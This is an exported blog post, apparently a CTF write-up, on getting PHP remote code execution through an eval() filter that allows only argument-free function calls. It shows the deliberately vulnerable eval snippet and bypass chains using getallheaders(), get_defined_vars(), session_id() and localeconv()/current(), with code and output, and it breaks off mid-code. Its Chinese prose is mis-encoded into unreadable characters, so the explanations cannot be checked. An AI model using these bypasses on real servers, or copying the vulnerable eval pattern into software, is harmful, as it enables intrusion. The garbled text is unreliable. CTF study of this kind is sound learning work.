{"title":"æ— å‚æ•°å‡½æ•°RCE","uid":"452153053cb456e93e9f321b6100ce19","slug":"æ— å‚æ•°å‡½æ•°RCE","date":"2020-10-27T08:24:44.000Z","updated":"2020-10-27T13:33:46.000Z","comments":true,"path":"api/articles/æ— å‚æ•°å‡½æ•°RCE.json","keywords":"A1andNS","cover":[],"content":"<p>æœ€è¿‘åšé¢˜é‡åˆ°äº†æ— å‚æ•°å‡½æ•°æ¥RCEçš„é¢˜ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ä¸€äº›æƒ³æ³•ï¼Œä»¥å¤‡åæ¥æŸ¥è¯ã€‚</p>\n<p>è¿™ç§é¢˜ç›®çš„åšæ³•åŸºæœ¬ä¸Šå°±æ˜¯ï¼Œåˆ©ç”¨è¶…çº§å…¨å±€å˜é‡æ¥è¿›è¡Œbypassï¼Œåˆ©ç”¨å‡½æ•°çš„åµŒå¥—çš„æ›¿ä»£å‚æ•°çš„å‡ºç°ã€‚ç„¶åè¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>\n<h2 id=\"æ— å‚æ•°å‡½æ•°\"><a href=\"#æ— å‚æ•°å‡½æ•°\" class=\"headerlink\" title=\"æ— å‚æ•°å‡½æ•°\"></a>æ— å‚æ•°å‡½æ•°</h2><p>é€šå¸¸æ¥è¯´å¦‚æœåœ¨PHPä¸­æœ‰ä¸€ä¸ªè¯­å¥</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨cmdè¿™ä¸ªå‚æ•°æ¥getshellã€‚</p>\n<p>ä½†æ˜¯å¾ˆå¯æƒœçš„æ˜¯cmdè¿™ä¸ªå‚æ•°è¢«åšäº†è¿‡æ»¤ã€‚</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">';'</span> <span class=\"token operator\">===</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[^\\W]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>    \n    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>å˜æˆäº†è¿™æ ·åï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨å‚æ•°å°±ä¼šå‡ºç°é—®é¢˜ï¼Œæ­£åˆ™æ ¡éªŒæ˜¯æ— æ³•é€šè¿‡çš„ã€‚è¿™é‡Œå¯ä»¥å»çœ‹ä¸€ä¸‹[GXYCTF2019]ç¦æ­¢å¥—å¨ƒï¼ŒBUUOJä¸Šæœ‰ç¯å¢ƒã€‚</p>\n<p><code>/[^\\W]+\\((?R)?\\)/</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027163530749.png\" alt=\"image-20201027163530749\"></p>\n<p>å¦‚æœè¾“å…¥çš„æ˜¯system(â€˜lsâ€™)è¿™æ ·çš„æœ‰å‚æ•°å‡½æ•°ï¼Œæ­£åˆ™åŒ¹é…å°±ä¼šåŒ¹é…ä¸åˆ°ï¼Œä»è€Œæ²¡æœ‰æ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆ===â€™;â€™çš„æ¡ä»¶å°±æ— æ³•æ»¡è¶³ã€‚</p>\n<p>åªæœ‰<code>a();</code>ã€<code>a(b(c()));</code>è¿™æ ·çš„æ ¼å¼æ‰èƒ½å¤Ÿè¢«åŒ¹é…ã€‚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027163830687.png\" alt=\"image-20201027163830687\"></p>\n<p>ä¸Šé¢è¿™ä¸ªæ­£åˆ™å°±æ˜¯æ˜æ˜¾çš„è¿‡æ»¤å‚æ•°ï¼Œåªå…è®¸æ— å‚æ•°å‡½æ•°çš„è¡¨ç°ã€‚</p>\n<h2 id=\"è¶…çº§å…¨å±€å˜é‡\"><a href=\"#è¶…çº§å…¨å±€å˜é‡\" class=\"headerlink\" title=\"è¶…çº§å…¨å±€å˜é‡\"></a>è¶…çº§å…¨å±€å˜é‡</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥é˜…PHPæ‰‹å†Œï¼Œæ‰¾åˆ°å¾ˆå¤šè¶…çº§å…¨å±€å˜é‡ã€‚</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>PHPä¸­é¢„å®šä¹‰äº†å‡ ä¸ªè¶…çº§å…¨å±€å˜é‡ï¼ˆsuperglobalsï¼‰ ï¼Œè¿™æ„å‘³ç€å®ƒä»¬åœ¨ä¸€ä¸ªè„šæœ¬çš„å…¨éƒ¨ä½œç”¨åŸŸä¸­éƒ½å¯ç”¨ã€‚ ä½ ä¸éœ€è¦ç‰¹åˆ«è¯´æ˜ï¼Œå°±å¯ä»¥åœ¨å‡½æ•°åŠç±»ä¸­ä½¿ç”¨ã€‚</p></blockquote>\n<pre class=\"line-numbers language-PHP\" data-language=\"PHP\"><code class=\"language-PHP\">PHP è¶…çº§å…¨å±€å˜é‡åˆ—è¡¨:\n\n$GLOBALS\n\n$_SERVER\n\n$_REQUEST\n\n$_POST\n\n$_GET\n\n$_FILES\n\n$_ENV\n\n$_COOKIE\n\n$_SESSION<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>è¯¦ç»†å¯ä»¥æŸ¥çœ‹<a href=\"https://www.php.cn/php/php-superglobals.html\">https://www.php.cn/php/php-superglobals.html</a></p>\n<p>è¿™é‡Œé¢æœ‰ä¸ªæœ‰è¶£çš„è¶…çº§å…¨å±€å˜é‡<code>$_ENV</code></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>$_ENVæ•°ç»„ä¸­çš„å†…å®¹æ˜¯åœ¨phpè§£æå™¨è¿è¡Œæ—¶ï¼Œä»phpæ‰€åœ¨æœåŠ¡å™¨ä¸­çš„ç¯å¢ƒå˜é‡è½¬å˜ä¸ºphpå…¨å±€å˜é‡çš„,å¯ä»¥è®¤ä¸ºå®ƒå°±æ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡çš„é›†åˆ</p></blockquote>\n<p>è¿™é‡Œæœ‰ä¸€ä¸ªå’Œ$_ENVæœ‰å…³çš„ä¸€ä¸ªå‡½æ•°getenv(),å®˜æ–¹æ‰‹å†Œå¯¹å®ƒçš„ä»‹ç»æ˜¯</p>\n<p><a href=\"https://www.php.net/manual/en/function.getenv.php\">https://www.php.net/manual/en/function.getenv.php</a></p>\n<h2 id=\"getenv\"><a href=\"#getenv\" class=\"headerlink\" title=\"getenv()\"></a>getenv()</h2><p><code>getenv(name)</code>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°è·å–ä¸€ä¸ªåä¸ºnameç¯å¢ƒå˜é‡çš„å€¼ã€‚ </p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027184405494.png\" alt=\"image-20201027184405494\"></p>\n<h3 id=\"array-rand\"><a href=\"#array-rand\" class=\"headerlink\" title=\"array_rand()\"></a>array_rand()</h3><p>è¿™ä¸ªä¼šç»å¸¸ç”¨åˆ°ï¼Œä½œç”¨æ˜¯ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒã€‚</p>\n<p><a href=\"https://www.php.net/manual/en/function.array-rand.php\">https://www.php.net/manual/en/function.array-rand.php</a></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"v\"</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'t'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n    \nç»“æœï¼šint(3)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>è¿™æ ·å°±å¯ä»¥å–å‡ºä¸€ä¸ªå•å…ƒï¼Œä½†æ˜¯è¿™é‡Œè¿”å›çš„æ˜¯é”®ï¼Œè€Œä¸æ˜¯å€¼ã€‚å¦‚æœæƒ³è¦å¾—åˆ°å€¼ï¼Œå°±å¯ä»¥ç”¨ä¸€ä¸ªå‡½æ•°å…ˆå¤„ç†ä¸€ä¸‹ã€‚è¿™å°±æ˜¯ä¸‹é¢è¦è¯´çš„è¿™ä¸ªå‡½æ•°äº†ã€‚</p>\n<h3 id=\"array-flip\"><a href=\"#array-flip\" class=\"headerlink\" title=\"array_flip()\"></a>array_flip()</h3><p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯äº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼Œè¿™æ ·åŸæ¥çš„é”®å°±å˜æˆå€¼äº†ï¼Œè€ŒåŸæ¥çš„å€¼å°±å˜æˆé”®äº†ã€‚</p>\n<p><a href=\"https://www.php.net/manual/zh/function.array-flip.php%C2%B7%C2%B7\">https://www.php.net/manual/zh/function.array-flip.phpÂ·Â·</a></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"v\"</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'t'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n    \nç»“æœï¼š\nstring(1) \"v\"\nstring(1) \"s\"\nstring(1) \"v\"\nstring(1) \"b\"\nstring(1) \"a\"\nstring(1) \"s\"\nstring(1) \"v\"\nstring(1) \"s\"\nstring(1) \"t\"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"localeconv\"><a href=\"#localeconv\" class=\"headerlink\" title=\"localeconv()\"></a>localeconv()</h3><p>è¿™ä¸ªå‡½æ•°ä¹Ÿä¼šç»å¸¸è¢«ç”¨åˆ°ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€äº›å­—ç¬¦ç»„æˆçš„æ•°ç»„ï¼Œé€šè¿‡ä½¿ç”¨localeconv()å’Œcurrent()ç­‰æ•°ç»„æ“ä½œå‡½æ•°ç»“åˆï¼Œå°±å¯ä»¥åšåˆ°è¯»å‡ºæŸä¸ªå­—ç¬¦ã€‚</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\n    \nç»“æœï¼šstring(1) \".\"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>ç»å¸¸è¢«ç”¨æ¥æ›¿ä»£ç‚¹ç¬¦å·<code>.</code></p>\n<h2 id=\"getallheaders\"><a href=\"#getallheaders\" class=\"headerlink\" title=\"getallheaders()\"></a>getallheaders()</h2><p>getenv()å‡½æ•°æ˜¯ç”¨æ¥è·å–ç¯å¢ƒå˜é‡çš„ï¼Œè€Œè¿™ä¸ªgetallheadersåˆ™æ˜¯ç”¨æ¥è·å–http headerçš„</p>\n<p><a href=\"https://www.php.net/manual/zh/function.getallheaders.php\">https://www.php.net/manual/zh/function.getallheaders.php</a></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\nvar_dump(getallheaders());\n?&gt;\n\n\nç»“æœï¼š\narray(13) &#123;\n  [&quot;Content-Length&quot;]&#x3D;&gt;\n  string(1) &quot;0&quot;\n  [&quot;Cookie&quot;]&#x3D;&gt;\n  string(85) &quot;_ga&#x3D;GA1.1.125883784.1603376093; Phpstorm-b0ddb94&#x3D;486c1e0a-aca9-446a-ad57-e43c4cbfd510&quot;\n  [&quot;Accept-Language&quot;]&#x3D;&gt;\n  string(47) &quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6&quot;\n  [&quot;Accept-Encoding&quot;]&#x3D;&gt;\n  string(17) &quot;gzip, deflate, br&quot;\n  [&quot;Sec-Fetch-Dest&quot;]&#x3D;&gt;\n  string(8) &quot;document&quot;\n  [&quot;Sec-Fetch-User&quot;]&#x3D;&gt;\n  string(2) &quot;?1&quot;\n  [&quot;Sec-Fetch-Mode&quot;]&#x3D;&gt;\n  string(8) &quot;navigate&quot;\n  [&quot;Sec-Fetch-Site&quot;]&#x3D;&gt;\n  string(4) &quot;none&quot;\n  [&quot;Accept&quot;]&#x3D;&gt;\n  string(124) &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;\n  [&quot;User-Agent&quot;]&#x3D;&gt;\n  string(131) &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36 Edg&#x2F;86.0.622.51&quot;\n  [&quot;Upgrade-Insecure-Requests&quot;]&#x3D;&gt;\n  string(1) &quot;1&quot;\n  [&quot;Host&quot;]&#x3D;&gt;\n  string(15) &quot;localhost:63342&quot;\n  [&quot;Content-Type&quot;]&#x3D;&gt;\n  string(0) &quot;&quot;\n&#125;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>è¿™é‡Œå¦‚æœæˆ‘åœ¨httpå¤´éƒ¨å†™å…¥ä¸€äº›æ¶æ„å‡½æ•°ä¼šå¦‚ä½•å‘¢ï¼Ÿ</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">';'</span> <span class=\"token operator\">===</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[^\\W]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>æˆ‘è¿™é‡Œæ·»åŠ ä¸€ä¸ªå¤´ä¿¡æ¯ï¼Œç„¶åå¯ä»¥çœ‹åˆ°æœç„¶å‡ºç°äº†phpinfo()</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027190535392.png\" alt=\"image-20201027190535392\"></p>\n<p>æ›´è¿‘ä¸€æ­¥ï¼ŒåŠ ä¸Šcurrent()</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">string(10) &quot;phpinfo();&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>é‚£ä¹ˆåªè¦æŠŠvar_dumpæ”¹æˆeval()ï¼Œé‚£ä¹ˆæ˜¯å¦phpinfoå°±ä¼šè¢«æ‰§è¡Œäº†å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ç¡®å®æ‰§è¡Œäº†ã€‚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027190923761.png\" alt=\"image-20201027190923761\"></p>\n<p>è¯•ä¸€ä¸‹systemå‘½ä»¤ï¼Œç¡®å®ä½ çš„rceå°±å¼€å§‹äº†ã€‚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027191025538.png\" alt=\"image-20201027191025538\"></p>\n<p>ä½†æ˜¯æ³¨æ„åˆ°è¿™ä¸ªå‡½æ•°æ˜¯apacheç¯å¢ƒæ‰èƒ½ä½¿ç”¨çš„ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯å­˜åœ¨ä¸€å®šçš„å±€é™æ€§çš„ã€‚</p>\n<h2 id=\"get-defined-vars\"><a href=\"#get-defined-vars\" class=\"headerlink\" title=\"get_defined_vars()\"></a>get_defined_vars()</h2><p>ä¸ºäº†è§£å†³ä¸Šé¢çš„é—®é¢˜ï¼Œå°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°äº†</p>\n<p><a href=\"https://www.php.net/manual/zh/function.get-defined-vars.php\">https://www.php.net/manual/zh/function.get-defined-vars.php</a></p>\n<p>è¿™ä¸ªå‡½æ•°æ˜¯è¿”å›ç”±å·²ç»å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ã€‚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027191534840.png\" alt=\"image-20201027191534840\"></p>\n<p>å®ƒæ˜¯è¿”å›è¿™4ä¸ªè¶…çº§å…¨å±€å˜é‡çš„æ•°ç»„</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$_GET\n$_POST\n$_FILES\n$_COOKIE<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§é€šè¿‡postä¼ å‚æ„é€ æ¶æ„ä»£ç æˆ–è€…getä¼ å‚æ„é€ æ¶æ„ä»£ç ã€‚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027192059908.png\" alt=\"image-20201027192059908\"></p>\n<p>å’Œä¹‹å‰çš„æ€è·¯ä¸€æ ·åˆ©ç”¨ä¸€äº›phpçš„æ•°ç»„å‡½æ•°æ¥æå–æƒ³è¦çš„æ•°æ®ï¼Œè¿™é‡Œå¦‚æœä¸çŸ¥é“ç”¨ä¸Šé¢å‡½æ•°å¥½ï¼Œå¯ä»¥å»èœé¸Ÿæ•™ç¨‹æˆ–PHPæ‰‹å†ŒæŸ¥è¯¢arrayæ“ä½œå‡½æ•°ã€‚</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/27/BlMrSf.png\" alt=\"image 20201027192202107\"></p>\n<p>POSTåŒç†ï¼š</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/27/BlMzp6.png\" alt=\"image 20201027192410489\"></p>\n<p>ä½†æ˜¯ä¸€èˆ¬äº‹æƒ…æ²¡æœ‰é‚£ä¹ˆç®€å•ï¼Œä¼šæœ‰è¿‡æ»¤çš„ï¼Œç‰¹åˆ«æ˜¯postæˆ–cookieçš„ä¼ å‚å°±åŸºæœ¬ä¼šæœ‰è¿‡æ»¤ï¼Œç„¶åcookieä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ¯•ç«Ÿè¦åšæ ¡éªŒã€‚</p>\n<h2 id=\"session-id\"><a href=\"#session-id\" class=\"headerlink\" title=\"session_id()\"></a>session_id()</h2><p>è¿™é‡Œæˆ‘ä»¬å°±æ˜¯ä»$_COOKIEä¸‹æ‰‹äº†ï¼Œsession_id()å‡½æ•°æ˜¯ç”¨æ¥è·å–/è®¾ç½® å½“å‰ä¼šè¯ IDã€‚</p>\n<p><a href=\"https://www.php.net/manual/zh/function.session-id.php\">https://www.php.net/manual/zh/function.session-id.php</a></p>\n<p>å¯ä»¥è·å–PHPSESSIDçš„å€¼ï¼Œè€Œæˆ‘ä»¬çŸ¥é“PHPSESSIDå…è®¸å­—æ¯å’Œæ•°å­—å‡ºç°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æœ‰äº†æ–°çš„æ€è·¯</p>\n<p>åœ¨cookieå¤„ä¼ å…¥PHPSESSIDå°±å¥½äº†</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"_GET\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=></span>\n  <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"cmd\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=></span>\n    <span class=\"token keyword type-declaration\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">29</span><span class=\"token punctuation\">)</span> <span class=\"token string double-quoted-string\">\"var_dump(get_defined_vars());\"</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"_POST\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=></span>\n  <span 